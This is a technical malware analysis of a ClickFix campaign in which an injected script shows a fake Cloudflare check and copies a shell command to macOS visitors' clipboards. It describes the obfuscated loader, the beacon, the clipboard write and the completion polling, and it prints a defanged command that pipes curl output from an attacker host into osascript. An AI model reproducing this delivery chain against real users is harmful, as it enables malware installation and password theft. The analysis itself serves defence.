# Technical walkthrough

The delivered script was intentionally awkward to read. Its outer layer stored the real program as a long numeric array, XOR-decoded that array into Base64, decoded the Base64, applied a second XOR pass, and executed the result.

The notes below describe the logical program. They do not include the live one-line command or the final payload URL.

## 1. Outer loader

The loader reduced to this pseudocode:

```javascript
const unused = 6610;
const moreUnused = (unused - 6214) * 33;

let encoded = "";
for (const value of numericArray) {
  encoded += String.fromCharCode(value ^ 45);
}

const bytes = base64Decode(encoded);
let source = "";
for (const byte of bytes) {
  source += String.fromCharCode(byte ^ 83);
}

executeJavaScript(source);
```

The arithmetic values do not affect the result. The meaningful operations are numeric-array XOR, Base64 decoding, a second XOR, and dynamic execution through `new Function`.

## 2. Campaign constants and local state

The decoded script declared:

```text
campaign key: 7f6210a091c37ae9bfa1bfd2562d440d842370e171427c6b
control API:   hxxps://browse-veriid[.]beer/api.php
target OS:     macos
```

It derived a local-storage key from the campaign key and current hostname using an FNV-1a-like hash. For the observed hostname the resulting key was `_y7bglw`. Unless a campaign flag disabled deduplication, the script stopped when this key or an existing `#bw-cf-root` element was present.

It also generated a visitor ID with `crypto.randomUUID()`, with a manual UUID generator as fallback.

## 3. Visit beacon

The script immediately constructed:

```json
{
  "url": "<current page>",
  "ref": "<document referrer>",
  "vid": "<generated UUID>"
}
```

When Web Crypto was available, it hashed the campaign key with SHA-256, imported that hash as an AES-GCM key, encrypted the JSON with a random 12-byte IV, and sent `IV || ciphertext` to the control API in a `d` query parameter. The request used `mode: "no-cors"` and omitted credentials. An image request served as a fallback transport.

Without Web Crypto, the script fell back to sending the page URL, referrer, and visitor ID as clear query parameters. This beacon exposed browsing metadata to the attacker even when the Terminal command was never run.

## 4. Fake Cloudflare interface

The program embedded Cloudflare-like SVG assets and generated a random 16-character hexadecimal “Ray ID.” That value came from the malicious script; it was not evidence of a real Cloudflare challenge.

It injected a fixed-position root element with an extremely high `z-index`, inserted a matching stylesheet, and disabled scrolling on both `html` and `body`. The interface supported light and dark themes and localized its text from `navigator.languages` into English, German, French, Spanish, Italian, Portuguese, Chinese, Japanese, Korean, Turkish, Arabic, or Ukrainian.

The script also suppressed:

- F12;
- Control/Command+Shift+I, J, or C;
- Control/Command+U; and
- the context menu.

These controls discourage casual inspection but do not provide meaningful protection against browser developer tools.

## 5. Command acquisition

As soon as the overlay initialized, the browser sent an encoded form POST equivalent to:

```json
{
  "action": "dl",
  "k": "<campaign key>",
  "os": "macos",
  "vid": "<visitor UUID>",
  "ref": "<current page>"
}
```

Responses used a custom envelope: hexadecimal text was converted to bytes, XORed against the repeated campaign key, then parsed as JSON. The expected fields were:

```text
shCmd   victim-specific shell command
token   server-side victim token
redir   optional post-execution redirect
```

## 6. Clipboard delivery

The fake checkbox was initially displayed after a three-second spinner. Once clicked, the handler:

1. marked itself as one-shot;
2. reported a `cb` action to the server;
3. attempted to write the retrieved `shCmd` to the clipboard;
4. replaced the checkbox with a spinner; and
5. opened the modal shown in the screenshot.

Safari received a dedicated Clipboard API path using `navigator.clipboard.write()` and a `ClipboardItem`. The generic fallback created a hidden text area and called `document.execCommand("copy")`.

The visible steps—Command+Space, Terminal, Command+V, Enter—turn a browser clipboard write into user-authorized code execution.

## 7. Decoded shell stages

The observed clipboard text assigned an unused hexadecimal marker, decoded a Base64 shell fragment, and passed it to `eval`. The decoded fragment behaved as follows:

```text
response = GET hxxp://browse-veriid[.]beer/p/<64-hex victim token>
if response == "ok":
    decode another Base64 fragment and run it with zsh
```

The second fragment reduced to:

```text
curl -sfL hxxps://policysync[.]pro/<campaign path> | osascript -l JavaScript
```

Flag behavior:

- `-s` suppresses normal output and progress;
- `-f` treats HTTP error responses as failures;
- `-L` follows redirects; and
- `osascript -l JavaScript` executes the response as JXA.

The initial marker variable was not referenced again in the observed command. It may be camouflage or an artifact of command generation; there is not enough evidence to call it a tracker.

## 8. Completion polling

After showing the instructions, the browser polled the control server every 1.5 seconds for up to 180 seconds with a `check` action and the victim token. When the decoded response included `consumed`, the page:

1. removed the instruction modal;
2. displayed a green “Verification complete” state;
3. wrote the local deduplication marker;
4. waited four seconds;
5. removed the overlay and restored scrolling; and
6. optionally navigated to the server-supplied redirect.

This closes the social-engineering loop. The attacker can make the browser appear to validate precisely when the Terminal-side token is redeemed.

## 9. Scope and confidence

The browser behavior and two shell decoding layers are directly supported by captured evidence. The association with ClickFix is high confidence based on technique and contemporaneous threat-intelligence listings.

The JXA response was subsequently retrieved as inert bytes and statically analyzed. Its environment checks, decrypted configuration, Finder-app construction, and Mach-O download are documented in [`macos-payload.md`](macos-payload.md). The Mach-O was no longer available from its origin and was not executed. Public sample indexes identify its hash and classify it as a password-stealing macOS Trojan, but this report does not independently assign a family.

The server-side path that introduced the script into the WordPress page remains unknown.

